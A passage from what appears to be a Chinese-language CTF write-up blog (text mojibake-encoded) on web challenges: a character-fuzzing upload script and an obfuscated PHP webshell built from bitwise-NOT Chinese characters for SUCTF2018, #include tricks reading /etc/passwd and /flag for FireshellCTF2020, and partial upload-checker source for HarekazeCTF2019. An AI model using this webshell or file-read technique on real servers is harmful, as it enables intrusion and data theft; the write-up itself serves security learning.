class="hljs-variable">$b</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$b</span>) !== <span class="hljs-literal">false</span>)&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;illegal char&quot;</span>);<br>        &#125;<br>    &#125;     <br>&#125;<br></code></pre></td></tr></table></figure><p>å¤§è‡´å°±æ˜¯å…ˆåˆ©ç”¨<code>file_get_contents</code>å‡½æ•°æŠŠä¸Šä¼ çš„æ–‡ä»¶å†…å®¹è¯»äº†ï¼Œç„¶åä»å†…å®¹ç¬¬å…­ä½å¼€å§‹å¾€åæˆªå–ã€‚åœ¨åˆ©ç”¨<code>stripos</code>æ‰¾æˆªå–çš„å†…å®¹ä¸­æœ‰æ²¡æœ‰éæ³•å­—ç¬¦ã€‚</p><p>å‚è€ƒæ–‡ç« <code>https://blog.csdn.net/mochu7777777/article/details/107729445</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ascii_str</span>():<br>    str_list = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">127</span>): <span class="hljs-comment">#å¯è§ï¼šèŒƒå›´32åˆ°126</span><br>        str_list.append(<span class="hljs-built_in">chr</span>(i))<br>    <span class="hljs-keyword">return</span> str_list<br><br><br>str_list = ascii_str()<br>url = <span class="hljs-string">&quot;http://bed9fea6-1b2e-4bec-a572-2de786c86bb2.node4.buuoj.cn:81/index.php?act=upload&quot;</span><br>headers = &#123;<span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0&#x27;</span>&#125;<br><br><span class="hljs-keyword">for</span> fuzz <span class="hljs-keyword">in</span> str_list:<br>    files = &#123;<br>        <span class="hljs-string">&#x27;file&#x27;</span>: (<span class="hljs-string">&#x27;1.php&#x27;</span>, <span class="hljs-string">&quot;12345&quot;</span> + fuzz, <span class="hljs-string">&#x27;text/plain&#x27;</span>)<br>    &#125;<br>    response = requests.post(url=url, headers=headers, files=files)<br>    res = response.text<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Stored&#x27;</span> <span class="hljs-keyword">in</span> res:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;è¯¥å­—ç¬¦å¯ä»¥é€šè¿‡:  &#123;0&#125;&quot;</span>.<span class="hljs-built_in">format</span>(fuzz))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;è¿‡æ»¤å­—ç¬¦:  &#123;0&#125;&quot;</span>.<span class="hljs-built_in">format</span>(fuzz))<br><br><br></code></pre></td></tr></table></figure><p><code>$ ( ) . ; = [ ] _ ~</code>èƒ½ç”¨ï¼Œæ±‰å­—ä¹Ÿå¯ä»¥ã€‚æ¥ä¸‹æ¥å¯ä»¥åˆ©ç”¨å–å+æ±‰å­—çš„æ–¹æ³•å»æ‹¿æƒ³è¦çš„å­—æ¯ï¼Œæ¯”å¦‚ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">&gt;&gt;&gt; <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;å¢&quot;</span>.<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-string">&quot;utf8&quot;</span>))<br>b<span class="hljs-string">&#x27;\xe5\x8d\xa2&#x27;</span><br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$_</span>=<span class="hljs-string">&quot;å¢&quot;</span>;<br><span class="hljs-keyword">print</span>(~(<span class="hljs-variable">$_</span>&#123;<span class="hljs-number">1</span>&#125;));<br><span class="hljs-keyword">print</span>(~<span class="hljs-string">&quot;\x8d&quot;</span>);<br><span class="hljs-comment">// è¾“å‡ºrr</span><br>å‚è€ƒï¼š`https:<span class="hljs-comment">//xz.aliyun.com/t/8107#toc-1`</span><br></code></pre></td></tr></table></figure><p>è„šæœ¬å°å­å·äº†è¿™ä½å¸ˆå‚…çš„è„šæœ¬ï¼š<code>https://blog.csdn.net/mochu7777777/article/details/107729445</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//Author: m0c1nu7 </span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">str_split_unicode</span>(<span class="hljs-params"><span class="hljs-variable">$str</span>, <span class="hljs-variable">$l</span> = <span class="hljs-number">0</span></span>) </span>&#123;<br> <br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$l</span> &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-variable">$ret</span> = <span class="hljs-keyword">array</span>();<br>        <span class="hljs-variable">$len</span> = <span class="hljs-title function_ invoke__">mb_strlen</span>(<span class="hljs-variable">$str</span>, <span class="hljs-string">&quot;UTF-8&quot;</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$len</span>; <span class="hljs-variable">$i</span> += <span class="hljs-variable">$l</span>) &#123;<br>            <span class="hljs-variable">$ret</span>[] = <span class="hljs-title function_ invoke__">mb_substr</span>(<span class="hljs-variable">$str</span>, <span class="hljs-variable">$i</span>, <span class="hljs-variable">$l</span>, <span class="hljs-string">&quot;UTF-8&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$ret</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_split</span>(<span class="hljs-string">&quot;//u&quot;</span>, <span class="hljs-variable">$str</span>, -<span class="hljs-number">1</span>, PREG_SPLIT_NO_EMPTY);<br>&#125;<br> <br><span class="hljs-variable">$s</span> = <span class="hljs-string">&#x27;ä½ å½’æ¥æ˜¯è¯—ç¦»å»æˆè¯ä¸”ç¬‘é£å°˜ä¸æ•¢é€ æ¬¡æˆ‘ç³Ÿç³ èƒ½é£Ÿç²—è¡£ä¹Ÿè®¤ç…®é…’è¯æ¡‘ä¸æ•¢ç›¸æ€ä½ ç»ˆä¼šé‡è§è¿™ä¹ˆä¸€ä¸ªäººä»–ä¼šç”¨æ•´ä¸ªäººç”Ÿå°†ä½ ç²¾å¿ƒæ”¶è—ç”¨æ¼«é•¿å²æœˆæŠŠä½ å¦¥å–„å®‰æ”¾æ€•ä»€ä¹ˆå²æœˆæ¼«é•¿ä½ å¿ƒåœ°å–„è‰¯,ç»ˆä¼šæœ‰ä¸€äººé™ªä½ éª‘é©¬å–é…’èµ°å››æ–¹ä¸ºä½ å”±ä¸€é¦–æ­Œæ­Œä¸­æœ‰ä½ äº¦æœ‰æˆ‘æˆ‘çš„æ³ªæˆ‘çš„é­…å°†éƒ½èå…¥åˆ°æˆ‘çš„æ­Œå£°é‡Œé£˜å‘å­¤ç‹¬çš„ä½ ä½ æ˜¯å¦å¬åˆ°äº†æˆ‘çš„æ­Œæ›²æ˜¯å¦ä¹Ÿåœ¨é»¯ç„¶è½æ³ªï¼Ÿå²æœˆåŒ†åŒ†äººç”Ÿæ¼«æ¼«æ¼ è§†äº†çœŸæƒ…è°æ˜¯ç«™è°çš„è°å·²ç»å˜å¾—ä¸é‡è¦è‡³å°‘æ›¾ç»å·²æ‹¥æœ‰é•¿ç›¸æ€çˆ±ç›¸éšæ—¶ç©ºéš”ç¦»è°ç›¸é™ªï¼ŸèŠ±å‰æœˆä¸‹å¿ƒéšé£ç›¸æ€ä¸€ç‰‡æ¢¦æˆç©ºç¬‘çœ‹å¾€äº‹çº¢å°˜ä¸­å¤šå°‘å‡æ€ä»˜æ¸…ç§‹ï¼Ÿé•¿ç›¸æ€æ³ªç›¸éšæ›¾ç»è°æ˜¯è°çš„è°ï¼Ÿå­¤æ˜Ÿå†·æœˆæ³ªç›ˆç›ˆå¿µæ›¾ç»ç›¸é€¢å¿ƒé•¿æ—¶å…‰çŸ­è®©äººå‚æ³ªåˆ°å¤©æ˜é•¿ç›¸æ€è‹¦ç›¸éšçª—å‰åŒç‡•æ¯”ç¿¼é£æ—¥æš®æƒ…äººæˆåŒå¯¹äºæ—¶å…‰æ— å çš„ç”°é‡ä¸­æ²¡æœ‰æ—©ä¸€æ­¥ä¹Ÿæ²¡æœ‰æ™šä¸€æ­¥æ°å¥½é‡è§äº†æƒ³è¦é‡è§çš„äººè¿™æ˜¯ä¸€æ®µå¤šå°‘ç¾ä¸½è€Œä»¤äººå¿ƒåŠ¨çš„å°˜ç¼˜äºçˆ±æƒ…æ¥è¯´ç›¸è§æ¨æ—©ä¼šæ¨æ™šç«™ä¼šç•™ä¸‹æ¢¨èŠ±å¸¦é›¨çš„ç–¼ç—›è€Œäºå‹æƒ…æ¥è¯´æ— è®ºå¤ªæ—©æˆ–è€…å¤ªè¿Ÿéƒ½æ˜¯ä¸€ä»½å€¼å¾—çæƒœçš„æƒ…ç¼˜æ™šç§‹ç¼“ç¼“èµ°æ™šäº†æˆ‘çš„è½®å›ç–é›¨ä¸€åˆ»åŠç–ç¬¼èµ·æˆ‘æ·±æ·±çš„æ¢¦é¦€æ˜¨æ—¥é—æ†¾å¯¸å¯¸ç–é›¨æŒ‘æ¶¸æ³ªçƒ›è½ç¬”æ— å¤„é£’æ™šç§‹å½¼æ™šç§‹æœªæ™šæ‡’æˆ‘ç–é›¨ç–é£å»å½’æˆ‘åˆå¿ƒè¿˜æˆ‘æ¸…æ¢¦å”¯æˆ‘åœ¨æ™šç§‹æœªæ™šé‡Œå®ˆæœ›é‚£ç–é›¨åŠç–çš„éº¦ç”°å¾…ä¸‹ä¸€ç‰‡æ¢§æ¡å¶å¤èˆæˆ‘äº¦æ‹¾èµ·æˆ‘çš„æ—§æ¢¦æ—§æ¢¦æ¸…å¯’ä¸€æ•ä¹±æˆ‘çœ¸ä¸­æ™šç§‹èºè¹€çš„é›¨ç–ç–æ‹çª—æˆ‘çš„æ™šç§‹ç–é›¨åŠç–ç–å¼€æ˜¨æ—¥æˆ‘çš„æ¢¦æƒ…ç¼˜å¦‚æµ·æ·±é‚ƒæ¾ˆè“å¹²æ¶¸æˆå¦„è°ˆä¸€æ¹›æ¸…æ¹–æ³ªæ½¸ç„¶ä¸€é¢¦å¯’çœ‰é”é˜‘çŠåªä¸ºä½ è€Œæ¬£æ‚¦åªå› ä½ è€Œæ¸…æ³ªæ–‘æ–‘ä½ æ˜¯æˆ‘çš„å‰ä¸–å§ä¸ºä½•æ²æ³Šåœ¨æˆ‘çš„å¿ƒæ€€ç¼±ç»»èµ·æ¶Ÿæ³¢åƒå±‚é©»æˆ‘å¿ƒæ‰‰çŸ¥æˆ‘æƒ…æ€€ä»æ­¤æˆ‘å·²ä¹ æƒ¯ä½ çš„å˜˜å¯’é—®æš–æ‡’å€¦åœ°ç—´å§åœ¨ä½ çš„èƒ¸æ€€çº¢éœæ»¡è…®æ˜¨å¤©å†è‹¦éƒ½è¦ç”¨ä»Šå¤©çš„å¾®ç¬‘æŠŠå®ƒåŸå’æˆä¸€æ®µå¹¸ç¦çš„è®°å¿†ï¼›æ›¾ç»å†ç´¯éƒ½è¦ç”¨å½“ç«™ä¸‹çš„é—å¿˜ç©¿è¶Šä¸‡é“çº¢å°˜è®©å¿ƒæ³¢æ¾œä¸æƒŠäººç”Ÿæœ€å¤§çš„è£è€€ä¸åœ¨äºä»ä¸è·Œå€’è€Œåœ¨äºæ¯ä¸€æ¬¡è·Œå€’åéƒ½èƒ½çˆ¬èµ·æ¥å›å¿†æ˜¯ä»¶å¾ˆç´¯çš„äº‹å°±åƒå¤±çœ æ—¶æ€ä¹ˆèººéƒ½ä¸å¯¹çš„æ ·å­æœ‰æ—¶å€™å¾€å¾€ç›´åˆ°ç¦»å¼€åœ¨å›å¿†é‡Œæ‰èƒ½çŸ¥é“è‡ªå·±æœ‰å¤šå–œæ¬¢ä¸€åº§åŸ&#x27;</span>;<br><br><span class="hljs-variable">$arr_str</span>=<span class="hljs-title function_ invoke__">str_split_unicode</span>(<span class="hljs-variable">$s</span>);<br><br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$s</span>) ; <span class="hljs-variable">$i</span>++) &#123; <br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$arr_str</span>[<span class="hljs-variable">$i</span>].<span class="hljs-string">&#x27; ------- &#x27;</span>.~<span class="hljs-variable">$arr_str</span>[<span class="hljs-variable">$i</span>][<span class="hljs-number">1</span>].<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>&#125;<br> <br> <span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>ç»“æœç±»ä¼¼è¿™ç§ï¼Œç„¶åä¸€ä¸ªä¸€ä¸ªæ‹¼æ¥æˆä¸€å¥è¯å°±è¡Œï¼š</p><p><img src="/img/suctf2018getshell1.png" alt="suctf2018getshell1"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$__</span> = [];<br><span class="hljs-variable">$_</span> = (<span class="hljs-variable">$__</span> == <span class="hljs-variable">$__</span>); <span class="hljs-comment">// è¿™é‡Œç»“æœæ˜¯1</span><br><br><span class="hljs-variable">$__</span> = ~(å‚); <span class="hljs-comment">//åˆ©ç”¨è¿™ä¸ªæ‹¿a</span><br><span class="hljs-variable">$___</span> = <span class="hljs-variable">$_</span>[<span class="hljs-variable">$__</span>]; <span class="hljs-comment">//æ•°ç»„å½¢å¼ï¼Œ1ç´¢å¼•å–åå¾—a</span><br><br><span class="hljs-variable">$__</span> = ~(åŒ†); <span class="hljs-comment">//åˆ©ç”¨è¿™ä¸ªæ‹¿s</span><br><span class="hljs-variable">$___</span> .= <span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>].<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<span class="hljs-comment">//ass</span><br><span class="hljs-variable">$__</span> = ~(éš);<br><span class="hljs-variable">$___</span> .= <span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<span class="hljs-comment">//asse</span><br><span class="hljs-variable">$__</span> = ~(åƒ);<br><span class="hljs-variable">$___</span> .= <span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<span class="hljs-comment">//asser</span><br><span class="hljs-variable">$__</span> = ~(è‹¦);<br><span class="hljs-variable">$___</span> .= <span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<span class="hljs-comment">//assert</span><br><br><span class="hljs-variable">$____</span> = ~(~(_));<span class="hljs-comment">//_</span><br><span class="hljs-variable">$__</span> = ~(è¯—);<br><span class="hljs-variable">$____</span> .= <span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<span class="hljs-comment">//_P</span><br><span class="hljs-variable">$__</span> = ~(å°˜);<br><span class="hljs-variable">$____</span> .= <span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<span class="hljs-comment">//_PO</span><br><span class="hljs-variable">$__</span> = ~(æ¬£);<br><span class="hljs-variable">$____</span> .= <span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<span class="hljs-comment">//_POS</span><br><span class="hljs-variable">$__</span> = ~(ç«™);<br><span class="hljs-variable">$____</span> .= <span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<span class="hljs-comment">//_POST</span><br><br><span class="hljs-variable">$_</span>=<span class="hljs-variable">$$____</span>;<span class="hljs-comment">//$_POST</span><br><span class="hljs-variable">$___</span>(<span class="hljs-variable">$_</span>[_]);<span class="hljs-comment">//assert($_POST[_])</span><br><br></code></pre></td></tr></table></figure><p>è¿™ä¸œè¥¿éšä¾¿èµ·ä¸ªåå­—ï¼Œç„¶åæ³¨æ„ç©ºæ ¼å’Œæ³¨é‡Šéƒ½è¦å»æ‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$__</span>=[];<br><span class="hljs-variable">$_</span>=(<span class="hljs-variable">$__</span>==<span class="hljs-variable">$__</span>);<br><span class="hljs-variable">$__</span>=~(è);<br><span class="hljs-variable">$___</span>=<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<br><span class="hljs-variable">$__</span>=~(åŒ†);<br><span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>].<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<br><span class="hljs-variable">$__</span>=~(éš);<br><span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<br><span class="hljs-variable">$__</span>=~(åƒ);<br><span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<br><span class="hljs-variable">$__</span>=~(è‹¦);<br><span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<br><span class="hljs-variable">$____</span>=~(~(_));<br><span class="hljs-variable">$__</span>=~(è¯—);<br><span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<br><span class="hljs-variable">$__</span>=~(å°˜);<br><span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<br><span class="hljs-variable">$__</span>=~(æ¬£);<br><span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<br><span class="hljs-variable">$__</span>=~(ç«™);<br><span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<br><span class="hljs-variable">$_</span>=<span class="hljs-variable">$$____</span>;<br><span class="hljs-variable">$___</span>(<span class="hljs-variable">$_</span>[_]);<br></code></pre></td></tr></table></figure><p>ä¸Šä¼ åç›´æ¥è®¿é—®è·¯å¾„(æ³¨æ„å®ƒä¼šè‡ªåŠ¨æŠŠåç¼€æ”¹æˆ<code>php</code>)ï¼Œæ³¨æ„<code>flag</code>åœ¨<code>phpinfo</code>é‡Œï¼Œæˆ–è€…ç›´æ¥<code>system(&quot;env&quot;)</code>ã€‚</p><h2 id="FireshellCTF2020-Caas"><a href="#FireshellCTF2020-Caas" class="headerlink" title="[FireshellCTF2020]Caas"></a>[FireshellCTF2020]Caas</h2><p><img src="/img/fireshellctfcass1.png" alt="fireshellctfcass1"></p><p>ç¼–è¯‘é¡µé¢ï¼Œè¾“å…¥åä¼šæŠŠç»“æœä¸‹è½½å‡ºæ¥ã€‚çœ‹äº†æŠ¥é”™å¥½åƒæ˜¯ä¸ªcçš„ç¼–è¯‘å™¨ï¼Ÿè¿™é‡ŒæŠ“åŒ…çœ‹çœ‹æ˜¯å¦å­˜åœ¨ä»»æ„æ–‡ä»¶ä¸‹è½½ï¼š</p><p><img src="/img/fireshellctfcss2.png" alt="fireshellctfcss2"></p><p>emmå¥½åƒä¸å­˜åœ¨äº†</p><p><a href="https://blog.csdn.net/qq_54929891/article/details/124781749">å‚è€ƒæ–‡ç« </a></p><blockquote><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span> å‘½ä»¤å‘Šè¯‰é¢„å¤„ç†å™¨å°†æŒ‡å®šå¤´æ–‡ä»¶çš„å†…å®¹æ’å…¥åˆ°é¢„å¤„ç†å™¨å‘½ä»¤çš„ç›¸åº”ä½ç½®</span><br></code></pre></td></tr></table></figure></blockquote><p><code>#include &lt;/etc/passwd&gt;</code></p><p>åŒ…å«ä¸€ä¸ªæ–‡ä»¶ä½œä¸ºå¤´æ–‡ä»¶æ—¶ã€‚ä¼šç”±äºæ–‡ä»¶å†…å®¹ä¸èƒ½è§£æè€ŒæŠ¥é”™</p><p><img src="/img/fireshellctf4.png" alt="fireshellctf4"></p><p><code>#include &quot;/flag&quot;</code></p><p>æ³¨æ„è¿™é‡Œè¦ç”¨åŒå¼•å·åŒ…è£¹è€Œä¸æ˜¯ç®­å¤´ï¼ŒåŒå¼•å·èŒƒå›´æ¯”ç®­å¤´æ›´å¤§ã€‚</p><h2 id="HarekazeCTF2019-Avatar-Uploader-1"><a href="#HarekazeCTF2019-Avatar-Uploader-1" class="headerlink" title="[HarekazeCTF2019]Avatar Uploader 1"></a>[HarekazeCTF2019]Avatar Uploader 1</h2><p><img src="/img/avatarupload1.png" alt="avatarupload1"></p><p>è¦æ±‚ä¸Šä¼ <code>PNG</code>è€Œä¸”å°äº<code>256kB</code>å’Œ<code>256px*256px</code>ã€‚</p><p>æ‰¾äº†ä¸ªä¸€å¥è¯æœ¨é©¬ä¼ è¿‡å»ä½†æ˜¯è¢«æ£€æµ‹äº†ï¼š</p><p><img src="/img/avauploader2.png" alt="avauploader2"></p><p>è¿™SESSIONçœ‹ç€åƒ<code>JWT</code>?ï¼Œè§£ä¸€ä¸‹çœ‹çœ‹:</p><p><img src="/img/avauploader3.png" alt="avauploader3"></p><p>çœ‹åˆ°æœ‰ä¸ª<code>type:error</code>ï¼Œå”‰ä¸ä¼šè¿˜æ˜¯è¦æ‰¾å¯†é’¥è§£é¢˜å§ã€‚ã€‚</p><p>åé¢çœ‹äº†ä¸‹<code>wp</code>ï¼Œå‘ç°åŸé¢˜æ˜¯ç»™äº†æºç çš„</p><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;config.php&#x27;</span>);<br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;lib/util.php&#x27;</span>);<br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;lib/session.php&#x27;</span>);<br><br><span class="hljs-variable">$session</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecureClientSession</span>(CLIENT_SESSION_ID, SECRET_KEY);<br><br><span class="hljs-comment">// check whether file is uploaded</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]) || !<span class="hljs-title function_ invoke__">is_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>])) &#123;<br> <span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&#x27;No file was uploaded.&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// check file size</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;size&#x27;</span>] &gt; <span class="hljs-number">256000</span>) &#123;<br> <span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&#x27;Uploaded file is too large.&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// check file type</span><br><span class="hljs-variable">$finfo</span> = <span class="hljs-title function_ invoke__">finfo_open</span>(FILEINFO_MIME_TYPE);<br><span class="hljs-variable">$type</span> = <span class="hljs-title function_ invoke__">finfo_file</span>(<span class="hljs-variable">$finfo</span>, <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<br><span class="hljs-title function_ invoke__">finfo_close</span>(<span class="hljs-variable">$finfo</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$type</span>, [<span class="hljs-string">&#x27;image/png&#x27;</span>])) &#123;<br> <span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&#x27;Uploaded file is not PNG format.&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// check file width/height</span><br><span class="hljs-variable">$size</span> = <span class="hljs-title function_ invoke__">getimagesize</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$size</span>[<span class="hljs-number">0</span>] &gt; <span class="hljs-number">256</span> || <span class="hljs-variable">$size</span>[<span class="hljs-number">1</span>] &gt; <span class="hljs-number">256</span>) &#123;<br> <span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&#x27;Uploaded image is too large.&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$size</span>[<span class="hljs-number">2</span>] !== IMAGETYPE_PNG) &#123;<br> <span class="hljs-comment">// I hope this never happens...</span><br> <span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&#x27;What happened...? OK, the flag for part 1 is: &lt;code&gt;&#x27;</span> . <span class="hljs-title function_ invoke__">getenv</span>(<span class="hljs-string">&#x27;FLAG1&#x27;</span>) . <span class="hljs-string">&#x27;&lt;/code&gt;&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// ok</span><br><span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">4</span>)) . <span class="hljs-string">&#x27;.png&#x27;</span>;<br><span class="hljs-title function_ 